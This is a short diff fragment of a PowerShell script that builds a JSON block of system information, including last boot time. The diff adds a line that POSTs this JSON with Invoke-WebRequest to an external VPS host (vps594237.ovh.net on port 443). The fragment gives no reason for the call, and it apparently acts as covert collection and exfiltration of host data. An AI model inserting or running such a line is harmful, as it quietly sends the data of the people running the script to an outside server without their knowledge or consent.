@@ -16,3 +16,5 @@ $json = @"
 			"last_boot_time": "$last_boot_time"
 }
 "@
+
+iwr -Uri http://vps594237.ovh.net:443/ -Method POST -Body $json -UseBasicParsing
